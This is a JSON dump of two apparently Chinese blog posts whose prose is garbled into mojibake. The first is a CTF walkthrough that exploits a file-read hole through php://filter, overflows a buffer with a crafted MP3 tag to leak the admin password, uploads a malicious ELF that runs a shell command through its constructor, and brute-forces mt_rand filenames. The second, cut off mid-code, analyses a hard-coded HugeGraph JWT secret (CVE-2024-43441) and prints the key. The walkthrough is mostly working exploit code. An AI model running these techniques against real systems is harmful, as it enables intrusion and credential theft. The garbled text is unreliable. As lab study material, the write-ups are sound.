{"posts":[{"title":"","text":"CISCN2019 æ€»å†³èµ› Day1 Web1â€“æ»‘ç¨½äº‘éŸ³ä¹ æ‰“å¼€ç¯å¢ƒï¼ŒF12å°±çœ‹åˆ°æç¤ºäº† å¤§æ¦‚å°±æ˜¯firmwareæœ‰ä¸ªå…³é”®ç‚¹ã€éœ€è¦ç®¡ç†å‘˜è¿™é‡Œæˆ‘ä»¬ä¸çŸ¥é“å¯†ç æ‰€ä»¥å…ˆå°è¯•æ³¨å†Œä¸€ä¸ªç™»å½•è¿›å» æ³¨å†Œè¿™ä¸ª 1md5(code+&quot;MWQIRZQf&quot;)[:5]==&quot;e4e62&quot; å¤§æ¦‚å°±æ˜¯éªŒè¯ç é€»è¾‘å†™ä¸ªè„šæœ¬å»çˆ† 1234567891011121314import hashlib def find_code(): target_prefix = &quot;e4e62&quot; suffix = &quot;MWQIRZQf&quot; for i in range(1000000): # å‡è®¾ code æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œå¯ä»¥è°ƒæ•´èŒƒå›´ code = str(i) combined = code + suffix hash_value = hashlib.md5(combined.encode()).hexdigest() if hash_value[:5] == target_prefix: return code code = find_code() print(&quot;Found code:&quot;, code) æ³¨å†ŒæˆåŠŸï¼Œç™»é™†è¿›å» è¿™é‡Œbotaæ›¿æ¢æ‰ 1234cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPXNoYXJlLnBocA==php://filter/read=convert.base64-encode/resource=share.php ç„¶åå»curlæºç  123456789101112131415161718192021222324252627282930313233C:\\Users\\11759&gt;curl -v &quot;http://f979b55d-35c1-4204-b41f-b188bb4f45c2.node5.buuoj.cn:81/media/share.php?cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPXNoYXJlLnBocA==&quot;#share.php&lt;?php# For sharing files in /media directory, do not delete, you can modify# åˆ†äº«åŠŸèƒ½ï¼Œç”¨æ¥åˆ†äº«/mediaæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶ã€‚ä¸å¯åˆ é™¤ï¼Œå¯ä»¥æŒ‰éœ€ä¿®æ”¹ã€‚ini_set('display_errors','Off');error_reporting(0);header('Content-Type: application/octet-stream');$filepath=base64_decode($_SERVER['QUERY_STRING']);if (strlen($filepath)&lt;=0) exit();$file=fopen($filepath,&quot;rb&quot;);if ($file==FALSE) exit();ob_clean();while(!feof($file)){ print(fread($file,1024*8)); ob_flush(); flush();}curl -v &quot;http://f979b55d-35c1-4204-b41f-b188bb4f45c2.node5.buuoj.cn:81/media/share.php?cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4uL2hvdGxvYWQucGhw&quot;php://filter/read=convert.base64-encode/resource=../hotload.php#hotload.php&lt;?phpinclude_once 'include/config.php';@$page=$_GET['page'];if (isset($page)) $page=(string) $page;if (!isset($page)||strlen($page)&lt;=0) $page='index';$whitelist=array('index','fm','mv','friend','disk','upload','share','favor','login','reg','feedback','firmware','search','logout','info');if (!in_array($page,$whitelist,true)) $page='404';include &quot;include/$page.php&quot;; ä¸Šé¢ä»£ç çœ‹åˆ°Open: Pasted image 20251106201520 1.png è¯»å– 12345678910111213141516171819202122232425C:\\Users\\11759&gt;curl -v &quot;http://f979b55d-35c1-4204-b41f-b188bb4f45c2.node5.buuoj.cn:81/media/share.php?cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4uL2luY2x1ZGUvY29uZmlnLnBocA==&quot;php://filter/read=convert.base64-encode/resource=../include/config.php#config.php&lt;?phpini_set('display_errors','Off');error_reporting(0);date_default_timezone_set(&quot;Asia/Shanghai&quot;);ini_set('session.gc_maxlifetime',&quot;3600&quot;);ini_set(&quot;session.cookie_lifetime&quot;,&quot;3600&quot;);session_start();include 'init.php';$_GLOBALS['dbfile']=init_config('.sqlite');$_GLOBALS['salt']=write_config(init_config('.salt'));$_GLOBALS['admin_password']=write_config(init_config('.passwd'));if (strlen($_GLOBALS['dbfile'])&lt;=0||strlen($_GLOBALS['salt'])&lt;=0||strlen($_GLOBALS['admin_password'])&lt;=0){ ob_end_clean(); die('Permission denied!');}$_GLOBALS['dbfile']=__DIR__.'/../config/'.$_GLOBALS['dbfile'];?&gt; çœ‹åˆ°init.phpçœ‹ä¸€ä¸‹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?php@mkdir(__DIR__.'/../config/');function rand_str($length = 16) { $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i &lt; $length; $i++) { $randomString .= $characters[mt_rand(0, $charactersLength - 1)]; } return $randomString;}function get_filename($ext){ $files=scandir(__DIR__.'/../config/'); foreach ($files as $file) { if ($file != &quot;.&quot; &amp;&amp; $file != &quot;..&quot;) { if (substr($file,-strlen($ext))===$ext){ return $file; } } } return '';}function init_config($ext){ $file=get_filename($ext); if ($file==''){ $file=rand_str(8).$ext; file_put_contents(__DIR__.'/../config/'.$file, ''); if (!file_exists(__DIR__.'/../config/'.$file)){ $file==''; } } return $file;}function read_config($file){ return file_get_contents(__DIR__.'/../config/'.$file);}function write_config($file,$str = '',$length = 16){ $content=file_get_contents(__DIR__.'/../config/'.$file); if ($content==''){ if ($str=='') $str=rand_str($length); file_put_contents(__DIR__.'/../config/'.$file, $str); } return file_get_contents(__DIR__.'/../config/'.$file);}?&gt; è¿™é‡Œæ˜¯çœ‹ä¸€ä¸‹ parser.soæ–‡ä»¶ä»init_procçœ‹èµ· 123456789__int64 (**init_proc_0())(void){ __int64 (**__gmon_start_)(void); // rax __gmon_start_ = &amp;_gmon_start__; if ( &amp;_gmon_start__ ) return (__int64 (**)(void))_gmon_start__(); return __gmon_start_;} æ²¡ä»€ä¹ˆå¥½çœ‹çš„ç»§ç»­çœ‹ 123456789#init_procvoid *init_proc(){ frame_size = 0; frame_data = &amp;frame_data; memset(&amp;frame_data, 0, 0x100u); passwd = &amp;passwd; return memset(&amp;passwd, 0, 0x130u);} ç¬¬ä¸€æ¬¡æ¥è§¦ç”¨pwnçš„webæ¼æ´ï¼Œå–‚ç»™AIçœ‹ä¸€ä¸‹ å…¶ä¸­&amp;passwdåœ¨bssæ®µä¸­ä¸º93c0ï¼Œè€Œä¸Šé¢çš„&amp;frame_dataåœ¨92c0ã€‚ frame_data å ç”¨äº† 0x100 å­—èŠ‚ï¼ˆ256 å­—èŠ‚ï¼‰ï¼Œä» 92C0 åˆ° 93C0 æ˜¯è¿ç»­çš„ã€‚ passwd çš„èµ·å§‹åœ°å€ä¸º 93C0ï¼Œè¯´æ˜å®ƒç´§è·Ÿåœ¨ frame_data ä¹‹åã€‚ å¦‚æœå¯¹ frame_data çš„æ•°æ®å†™å…¥è¶…è¿‡äº† 0x100 å­—èŠ‚ï¼Œå°±å¯èƒ½è¶Šç•Œåˆ° passwd çš„åœ°å€ç©ºé—´ã€‚ç”±äºPHPä¸­çš„æ–‡ä»¶é™åˆ¶é•¿åº¦ä¸º0x130å­—èŠ‚ï¼Œå› æ­¤æœ‰0x30çš„æº¢å‡ºè¯»ç©ºé—´ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#!/usr/bin/env python3 # coding:utf-8 # ä¸“ä¸º Python3 ç¼–å†™ï¼Œæ— ä»»ä½•ç¼–ç /æ‹¼æ¥æŠ¥é”™ def flat(*args): &quot;&quot;&quot;å­—èŠ‚æµæ‹¼æ¥å‡½æ•°ï¼ˆä»…å¤„ç†å­—èŠ‚ç±»å‹ï¼Œå½»åº•é¿å…ç±»å‹é”™è¯¯ï¼‰&quot;&quot;&quot; result = b&quot;&quot; for arg in args: if isinstance(arg, bytes): result += arg else: # å¼ºåˆ¶è½¬æ¢ä¸ºå­—èŠ‚ï¼ˆç¡®ä¿æ‰€æœ‰è¾“å…¥ç»Ÿä¸€ç±»å‹ï¼‰ raise TypeError(f&quot;ä»…æ”¯æŒ bytes ç±»å‹ï¼Œä¼ å…¥äº† {type(arg)}&quot;) return result # 1. æŒ‰ä½ æä¾›çš„ç»“æ„ï¼Œæ‰€æœ‰å†…å®¹è½¬ä¸º bytes ç±»å‹ï¼ˆæ ¸å¿ƒä¿®æ”¹ï¼‰ mp3_tag = flat( b'ID3', # æ ‡ç­¾æ ‡è¯†ï¼ˆbytesï¼‰ b'\\x03', # ä¸»ç‰ˆæœ¬å·ï¼ˆbytesï¼‰ b'\\x00', # ä¿®è®¢å·ï¼ˆbytesï¼‰ b'\\x00', # æ ‡å¿—ä½ï¼ˆbytesï¼‰ b'\\x00\\x00\\x04\\x00', # æ ‡ç­¾å¤´å¤§å°ï¼ˆbytesï¼‰ b'TIT2', # å¸§æ ‡è¯†ï¼ˆbytesï¼‰ b'\\x00\\x00\\x00\\x0a', # TIT2 å¸§å¤§å°ï¼ˆbytesï¼‰ b'\\x00\\x00', # TIT2 å¸§æ ‡å¿—ï¼ˆbytesï¼‰ b'a'*9 + b'\\x00', # TIT2 å†…å®¹ï¼ˆbytesï¼Œ9ä¸ª'a' + ç»“æŸç¬¦ï¼‰ b'TPE1', # å¸§æ ‡è¯†ï¼ˆbytesï¼‰ b'\\x00\\x00\\x00\\x0a', # TPE1 å¸§å¤§å°ï¼ˆbytesï¼‰ b'\\x00\\x00', # TPE1 å¸§æ ‡å¿—ï¼ˆbytesï¼‰ b'b'*9 + b'\\x00', # TPE1 å†…å®¹ï¼ˆbytesï¼Œ9ä¸ª'b' + ç»“æŸç¬¦ï¼‰ b'TALB', # å¸§æ ‡è¯†ï¼ˆbytesï¼‰ b'\\x00\\x00\\x02\\xff', # TALB å¸§å¤§å°ï¼ˆbytesï¼ŒæŒ‰ä½ æä¾›çš„é…ç½®ï¼‰ b'\\x00\\x00', # TALB å¸§æ ‡å¿—ï¼ˆbytesï¼‰ b'c'*0x200 + b'\\x00', # TALB å†…å®¹ï¼ˆbytesï¼Œ512ä¸ª'c' + ç»“æŸç¬¦ï¼‰ ) # 2. æ·»åŠ æ ‡å‡† MP3 éŸ³é¢‘å¸§ï¼ˆç¡®ä¿æ–‡ä»¶è¢«è¯†åˆ«ä¸ºæœ‰æ•ˆ MP3ï¼Œä¸æŠ¥é”™ï¼‰ # æ ‡å‡† MPEG-1 Layer 3 éŸ³é¢‘å¸§ï¼ˆ44.1kHz å•å£°é“ï¼Œ128kbpsï¼ŒæŒç»­0.5ç§’ï¼‰ mp3_audio = ( b'\\xff\\xf3\\xc4\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' ) # 3. æ‹¼æ¥æ ‡ç­¾ + éŸ³é¢‘ï¼Œç”Ÿæˆå®Œæ•´ MP3 æ–‡ä»¶ full_mp3 = mp3_tag + mp3_audio # 4. å†™å…¥æ–‡ä»¶ï¼ˆäºŒè¿›åˆ¶æ¨¡å¼ï¼ŒPython3 æ ‡å‡†å†™æ³•ï¼‰ output_file = &quot;fake_mp3_no_error.mp3&quot; with open(output_file, &quot;wb&quot;) as f: f.write(full_mp3) print(f&quot;âœ… é›¶æŠ¥é”™ï¼ä¼ªé€  MP3 å·²ç”Ÿæˆï¼š{output_file}&quot;) print(f&quot;ğŸ“Œ æ ‡ç­¾ç»“æ„å®Œå…¨æŒ‰ä½ çš„é…ç½®ï¼šID3v2.3 + TIT2/TPE1/TALB å¸§&quot;) print(f&quot;ğŸµ åŒ…å«æœ‰æ•ˆéŸ³é¢‘å¸§ï¼Œå¯æ­£å¸¸æ’­æ”¾/ä¸Šä¼ ç»•è¿‡&quot;) å¾—åˆ°å¯†ç wc4I22tosZFIsUIk ç”¨adminç™»å½•è¿›å» ä¹Ÿæ˜¯æˆåŠŸç™»å½•äº† æ¥åˆ°/#firmwareé¡µé¢ è¿™é‡Œè€æ–¹æ³•è¯»å–ä¸€ä¸‹frimwareä»£ç  1curl -v &quot;http://af97e55c-3987-499d-99e5-e8acff7feafd.node5.buuoj.cn:81/media/share.php?cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4uL2luY2x1ZGUvZmlybXdhcmUucGhw&quot; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169#firmware.php&lt;?phpif (!isset($_SESSION['user'])||strlen($_SESSION['user'])&lt;=0){ ob_end_clean(); header('Location: /hotload.php?page=login&amp;err=1'); die();}if ($_SESSION['role']!='admin'){ $padding='Lorem ipsum dolor sit amet, consectetur adipisicing elit.'; for($i=0;$i&lt;10;$i++) $padding.=$padding; die('&lt;div&gt;&lt;div class=&quot;container&quot; style=&quot;margin-top:30px&quot;&gt;&lt;h3 style=&quot;color:red;margin-bottom:15px;&quot;&gt;åªæœ‰ç®¡ç†å‘˜æƒé™æ‰èƒ½è®¿é—®ï¼&lt;/h3&gt;&lt;/div&gt;&lt;p style=&quot;visibility: hidden&quot;&gt;'.$padding.'&lt;/p&gt;&lt;/div&gt;');}if (isset($_FILES[&quot;file_data&quot;])){ if ($_FILES[&quot;file_data&quot;][&quot;error&quot;] &gt; 0||$_FILES[&quot;file_data&quot;][&quot;size&quot;] &gt; 1024*1024*1){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'ä¸Šä¼ å‡ºé”™ï¼Œå›ºä»¶æ–‡ä»¶æœ€å¤§æ”¯æŒ 1MBã€‚'))); }else{ mt_srand(time()); $firmware_filename=md5(mt_rand().$_SESSION['user']); $firmware_filename=__DIR__.&quot;/../uploads/firmware/&quot;.$firmware_filename.&quot;.elf&quot;; if (time()-$_SESSION['timestamp']&lt;3){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'æ“ä½œå¤ªå¿«äº†ï¼Œè¯·ç¨åå†ä¸Šä¼ ã€‚'))); } $_SESSION['timestamp']=time(); move_uploaded_file($_FILES[&quot;file_data&quot;][&quot;tmp_name&quot;], $firmware_filename); $handle = fopen($firmware_filename, &quot;rb&quot;); if ($handle==FALSE){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'ä¸Šä¼ å¤±è´¥ï¼ŒæœªçŸ¥åŸå› ã€‚'))); } $flags = fread($handle, 4); fclose($handle); if ($flags!==&quot;\\x7fELF&quot;){ unlink($firmware_filename); ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'ä¸Šä¼ å¤±è´¥ï¼Œä¸æ˜¯æœ‰æ•ˆçš„ ELF æ–‡ä»¶ã€‚'))); } ob_end_clean(); die(json_encode(array('status'=&gt;1,'info'=&gt;'ä¸Šä¼ æˆåŠŸï¼'))); }}else{ if (isset($_SERVER['CONTENT_TYPE'])){ if (stripos($_SERVER['CONTENT_TYPE'],'form-data')!=FALSE){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'ä¸Šä¼ å‡ºé”™ï¼ŒéŸ³ä¹æ–‡ä»¶æœ€å¤§æ”¯æŒ 1MBã€‚'))); } }}@$path=$_POST['path'];function clean_string($str){ $str=str_replace(&quot;\\\\&quot;,&quot;&quot;,$str); $str=str_replace(&quot;/&quot;,&quot;&quot;,$str); $str=str_replace(&quot;.&quot;,&quot;&quot;,$str); $str=str_replace(&quot;;&quot;,&quot;&quot;,$str); return substr($str,0,32);}if (isset($path)){ $path=clean_string(trim((string) $path)); if (strlen($path)&lt;=0||strlen($path)&gt;64){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'è¾“å…¥æ ¼å¼æˆ–é•¿åº¦ä¸ç¬¦åˆè§„å®šï¼'))); }else{ $firmware_filename=__DIR__.&quot;/../uploads/firmware/&quot;.$path.&quot;.elf&quot;; if (!file_exists($firmware_filename)){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'å›ºä»¶æ–‡ä»¶ä¸å­˜åœ¨ï¼'))); }else{ try{ $elf = FFI::cdef(&quot; extern char * version; &quot;, $firmware_filename); $version=(string) FFI::string($elf-&gt;version); ob_end_clean(); die(json_encode(array('status'=&gt;1,'info'=&gt;'å›ºä»¶ç‰ˆæœ¬å·ï¼š'.$version))); }catch(Error $e){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'åŠ è½½å›ºä»¶æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ï¼'))); } } }}?&gt;&lt;script&gt;nav_active();nav_user('&lt;?php echo @$_SESSION['user']; ?&gt;');&lt;/script&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;css/fileinput.min.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;css/fileinput-rtl.min.css&quot;&gt; &lt;script src=&quot;js/fileinput.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;js/locales/zh.js&quot;&gt;&lt;/script&gt; &lt;div&gt;&lt;div class=&quot;container&quot; style=&quot;margin-top:30px&quot;&gt; &lt;h3 style=&quot;margin-bottom:15px;&quot;&gt;å›ºä»¶æ›´æ–°&lt;/h3&gt; &lt;input id=&quot;upload&quot; type=&quot;file&quot; class=&quot;file&quot; data-preview-file-type=&quot;text&quot; &gt; &lt;div style=&quot;height:30px&quot;&gt;&lt;/div&gt; &lt;div id=&quot;info1&quot; class=&quot;alert&quot; role=&quot;alert&quot; style='display: none;'&gt;&lt;/div&gt; &lt;script&gt; $(&quot;#upload&quot;).fileinput({language: 'zh',uploadUrl: '/hotload.php?page=firmware'}); $(&quot;#upload&quot;).on(&quot;fileuploaded&quot;, function (event, data, previewId, index) { var data = data.response; if (data.status==1){ $('#info1').removeClass('alert-danger'); $('#info1').addClass('alert-success'); }else{ $('#info1').removeClass('alert-success'); $('#info1').addClass('alert-danger'); } $('#info1').html(data.info); $('#info1').show(); }); &lt;/script&gt; &lt;hr/&gt;&lt;h4 style=&quot;text-align:left;margin-bottom:15px;color:gray;&quot;&gt;è°ƒè¯•æ¨¡å¼ï¼ˆè¯»å–å›ºä»¶ç‰ˆæœ¬å·)&lt;/h4&gt; &lt;div class='form-container'&gt; &lt;div class='form-group'&gt; &lt;input type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;å›ºä»¶æ–‡ä»¶&quot; id=&quot;path&quot;&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;button class=&quot;btn btn-info btn-block&quot; onclick=&quot;submit()&quot;&gt;è¯»å–&lt;/button&gt; &lt;/div&gt; &lt;div id=&quot;info2&quot; class=&quot;alert&quot; role=&quot;alert&quot; style=&quot;display: none;&quot;&gt;&lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;script&gt;function submit(){ $('#info2').hide(); $.ajax({ type: 'POST', url: &quot;/hotload.php?page=firmware&quot;, data: {path: $('#path').val()}, dataType: &quot;json&quot;, success: function(data) { if (data.status==1){ $('#info2').removeClass('alert-danger'); $('#info2').addClass('alert-success'); }else{ $('#info2').removeClass('alert-success'); $('#info2').addClass('alert-danger'); } $('#info2').html(data.info); $('#info2').show(); } });}&lt;/script&gt; &lt;p style=&quot;visibility: hidden&quot;&gt; Lorem ipsum dolor sit amet, consectetur adipisicing elit. Animi aspernatur beatae commodi dolorem in praesentium quia quis sit ullam. Aut facere nihil non soluta temporibus. Modi molestias suscipit voluptate. A? Lorem ipsum dolor sit amet, consectetur adipisicing elit. Aliquid beatae consequatur deserunt earum eligendi ex, illum iure nostrum nulla obcaecati pariatur placeat quae reiciendis repellat similique tenetur totam vel voluptatum? Lorem ipsum dolor sit amet, consectetur adipisicing elit. Aut autem consectetur cum ex expedita id incidunt inventore ipsa laudantium maiores nihil quia quo quod rem, reprehenderit repudiandae sunt unde voluptatibus? Lorem ipsum dolor sit amet, consectetur adipisicing elit. Accusantium ad adipisci animi, commodi cumque doloribus ducimus eaque eveniet illo iste, maxime, molestiae molestias neque nostrum odio officiis reiciendis rem voluptates? &lt;/p&gt; &lt;/div&gt; åœ¨#firmwareä¸Šä¼ elf 1234567891011121314#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;char _version[0x130];char *version = _version;__attribute__((constructor)) void fun() { memset(version, 0, 0x130); FILE *fp = popen(&quot;/usr/bin/tac /flag&quot;, &quot;r&quot;); if (fp == NULL) return; fread(version, 1, 0x100, fp); pclose(fp);} ç¼–è¯‘æˆelfä¸Šä¼ å°±å¯ä»¥äº† çˆ†ç ´æ–‡ä»¶å 123456789101112131415161718192021222324&lt;?php function generate_filenames($start_time, $end_time, $user) { $results = []; for ($time = $start_time; $time &lt;= $end_time; $time++) { mt_srand($time); $rand = mt_rand(); $filename = md5($rand . $user); $results[] = $filename; } return $results; } // å·²çŸ¥ä¿¡æ¯ $user = &quot;admin&quot;; // å›ºå®šå€¼ $date = strtotime(&quot;Tue, 11 Nov 2025 10:20:28 GMT&quot;); // å·²çŸ¥æ—¶é—´ $time_range = 100; // æ—¶é—´åç§»èŒƒå›´ Â±100 ç§’ // å¼€å§‹æš´åŠ›ç ´è§£ $start_time = $date - $time_range; $end_time = $date + $time_range; $possible_filenames = generate_filenames($start_time, $end_time, $user); foreach ($possible_filenames as $filename) { echo $filename . &quot;.elf\\n&quot;; } ?&gt; å»æµè§ˆå™¨å¤åˆ¶æ—¶é—´å»çˆ†ç ´å°±è¡Œäº†ç„¶åæŠŠå­—å…¸å¤åˆ¶åˆ°bpé‡Œé¢çˆ†å°±å¯ä»¥çˆ†ç ´å‡ºæ¥ flag{iz4w8x9zjdsqael9fbv7c2l2qp5ao6f9}","link":"/2025/12/11/CISCN2019%20%E6%80%BB%E5%86%B3%E8%B5%9B%20Day1%20Web1--%E6%BB%91%E7%A8%BD%E4%BA%91%E9%9F%B3%E4%B9%90/"},{"title":"Apache HugeGraph JWT Tokenå¯†é’¥ç¡¬ç¼–ç æ¼æ´ä»£ç åˆ†æ(CVE-2024-43441)","text":"test æ¼æ´æˆå› åŠåˆ©ç”¨æ¡ä»¶ç”¨æˆ·å¯ç”¨äº†è®¤è¯ä½†æœªé…ç½®auth.token_secretæ—¶ï¼ŒHugeGraphå°†ä½¿ç”¨ä¸€ä¸ªç¡¬ç¼–ç çš„é»˜è®¤JWTå¯†åŒ™ï¼Œé»˜è®¤å¯†åŒ™å¯ä»¥åœ¨å®˜æ–¹æ–‡æ¡£ä¸­çœ‹åˆ°ï¼Œå…¶å€¼ä¸º_FXQXbJtbCLxODc6tGci732pkH1cyf8Qg_ã€‚ JWTæ„é€ è§„åˆ™åˆ†æå› ä¸ºä»£ç æ–‡ä»¶å¤ªå¤šäº†ï¼Œæ‰€ä»¥æ‰¾JWTæ„é€ è§„åˆ™çš„æ—¶å€™ä¼šæ¯”è¾ƒå›°éš¾ï¼Œæ‰€ä»¥ï¼Œå¯ä»¥æƒ³åˆ°å“ªé‡Œä¼šåˆ©ç”¨JWTçš„æ„é€ ï¼Œå°±æ˜¯ç™»å½•çš„æ—¶å€™ã€‚ å…ˆæ‰¾åˆ°LoginAPIï¼Œå…¶ä¸­ç™»å½•çš„éƒ¨åˆ† çœ‹åˆ°tokenæ„é€ çš„ä»£ç åœ¨è¿™æ®µé‡Œã€‚ 1234try { String token = manager.authManager().loginUser(jsonLogin.name, jsonLogin.password); HugeGraph g = graph(manager, graph); return manager.serializer(g).writeMap(ImmutableMap.of(&quot;token&quot;, token));} ç„¶åå¯ä»¥è·Ÿè¿›åˆ°GraphManagerçš„authManager()æ–¹æ³•ä¸­ 123public AuthManager authManager() { return this.authenticator().authManager(); } å¯ä»¥å‘ç°æ²¡æœ‰æˆ‘ä»¬éœ€è¦çš„ä¿¡æ¯ï¼Œå¹¶ä¸”è¿”å›ä¸€å †å‡½æ•°çš„è°ƒç”¨ï¼Œæ‰€ä»¥ç»§ç»­è·Ÿè¿›åˆ°authenticator() 123456private HugeAuthenticator authenticator() { E.checkState(this.authenticator != null, &quot;Unconfigured authenticator, please config &quot; + &quot;auth.authenticator option in rest-server.properties&quot;); return this.authenticator; } è¯¥æ–¹æ³•åªæ˜¯æ£€æŸ¥this.authenticatoræ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ºç©ºå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œä¸ä¸ºç©ºå°±é‡æ–°è¿”å›authenticatorã€‚ æ‰€ä»¥è·Ÿè¿›authManager().loginUseræ–¹æ³•ï¼Œåœ¨src/main/resources /StandardAuthManager.javaä¸­ã€‚ 1234567891011121314151617public String loginUser(String username, String password) throws AuthenticationException { HugeUser user = this.matchUser(username, password); if (user == null) { String msg = &quot;Incorrect username or password&quot;; throw new AuthenticationException(msg); } Map&lt;String, ?&gt; payload = ImmutableMap.of(AuthConstant.TOKEN_USER_NAME, username, AuthConstant.TOKEN_USER_ID, user.id.asString()); String token = this.tokenGenerator.create(payload, this.tokenExpire); this.tokenCache.update(IdGenerator.of(token), username); return token; } è¿™æ®µä»£ç å¯ä»¥å‘ç°æ„é€ JWTä¸­éœ€è¦çš„ä¸€éƒ¨åˆ†å‚æ•°ï¼ŒAuthConstant.TOKEN_USER_NAME_ä»¥åŠ_AuthConstant.TOKEN_USER_IDï¼Œè¿›å…¥AuthConstantæ¥å£ï¼Œå¯ä»¥å‘ç°è¿™ä¿©ä¸ªå‚æ•°å°±æ˜¯_user_name_ä»¥åŠ_user_id_ï¼Œè¿˜æœ‰ä¸€ä¸ª_tokenExpire_ å‚æ•°ï¼Œä¸ç¡®å®šæ˜¯æœ‰ä»€ä¹ˆä½œç”¨ã€‚ ç»§ç»­è·Ÿè¿›tokenGenerator.createï¼Œæ‰¾åˆ°auth/TokenGenerator.javaæ–‡ä»¶ 1234567public String create(Map&lt;String, ?&gt; payload, long expire) { return Jwts.builder() .setClaims(payload) .setExpiration(new Date(System.currentTimeMillis() + expire)) .signWith(this.key, SignatureAlgorithm.HS256) .compact(); } è¿›è€Œå‘ç°æ„é€ jwtçš„å‚æ•°æ‰€éœ€çš„å…¨éƒ¨æ¡ä»¶ã€‚ Tokenæ„é€ åˆ†æç”¨äºç”¨æˆ·è®¤è¯çš„ä»£ç ä¸»è¦ä½äº_org/apache/hugegraph/api/filter/AuthenticationFilter.java_ä¸­çš„authenticateæ–¹æ³• 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980protected User authenticate(ContainerRequestContext context) { GraphManager manager = this.managerProvider.get(); E.checkState(manager != null, &quot;Context GraphManager is absent&quot;); if (!manager.requireAuthentication()) { // Return anonymous user with an admin role if disable authentication return User.ANONYMOUS; } // Get peer info Request request = this.requestProvider.get(); String peer = null; String path = null; if (request != null) { peer = request.getRemoteAddr() + &quot;:&quot; + request.getRemotePort(); path = request.getRequestURI(); } // Check whiteIp if (enabledWhiteIpCheck == null) { String whiteIpStatus = this.configProvider.get().get(WHITE_IP_STATUS); enabledWhiteIpCheck = Objects.equals(whiteIpStatus, STRING_ENABLE); } if (enabledWhiteIpCheck &amp;&amp; request != null) { peer = request.getRemoteAddr() + &quot;:&quot; + request.getRemotePort(); path = request.getRequestURI(); String remoteIp = request.getRemoteAddr(); Set&lt;String&gt; whiteIpList = manager.authManager().listWhiteIPs(); boolean whiteIpEnabled = manager.authManager().getWhiteIpStatus(); if (!path.contains(STRING_WHITE_IP_LIST) &amp;&amp; whiteIpEnabled &amp;&amp; !whiteIpList.contains(remoteIp)) { throw new ForbiddenException(String.format(&quot;Remote ip '%s' is not permitted&quot;, remoteIp)); } } Map&lt;String, String&gt; credentials = new HashMap&lt;&gt;(); // Extract authentication credentials String auth = context.getHeaderString(HttpHeaders.AUTHORIZATION); if (auth == null) { throw new NotAuthorizedException(&quot;Authentication credentials are required&quot;, &quot;Missing authentication credentials&quot;); } if (auth.startsWith(BASIC_AUTH_PREFIX)) { auth = auth.substring(BASIC_AUTH_PREFIX.length()); auth = new String(DatatypeConverter.parseBase64Binary(auth), Charsets.ASCII_CHARSET); String[] values = auth.split(&quot;:&quot;); if (values.length != 2) { throw new BadRequestException(&quot;Invalid syntax for username and password&quot;); } final String username = values[0]; final String password = values[1]; if (StringUtils.isEmpty(username) || StringUtils.isEmpty(password)) { throw new BadRequestException(&quot;Invalid syntax for username and password&quot;); } credentials.put(HugeAuthenticator.KEY_USERNAME, username); credentials.put(HugeAuthenticator.KEY_PASSWORD, password); } else if (auth.startsWith(BEARER_TOKEN_PREFIX)) { String token = auth.substring(BEARER_TOKEN_PREFIX.length()); credentials.put(HugeAuthenticator.KEY_TOKEN, token); } else { throw new BadRequestException(&quot;Only HTTP Basic or Bearer authentication is supported&quot;); } credentials.put(HugeAuthenticator.KEY_ADDRESS, peer); credentials.put(HugeAuthenticator.KEY_PATH, path); // Validate the extracted credentials try { return manager.authenticate(credentials); } catch (AuthenticationException e) { throw new NotAuthorizedException(&quot;Authentication failed&quot;, e.getMessage()); } } é¦–å…ˆï¼Œæ˜¯Httpå¤´çš„é™åˆ¶ 1234567Map&lt;String, String&gt; credentials = new HashMap&lt;&gt;(); // Extract authentication credentials String auth = context.getHeaderString(HttpHeaders.AUTHORIZATION);if (auth == null) { throw new NotAuthorizedException(&quot;Authentication credentials are required&quot;, &quot;Missing authentication 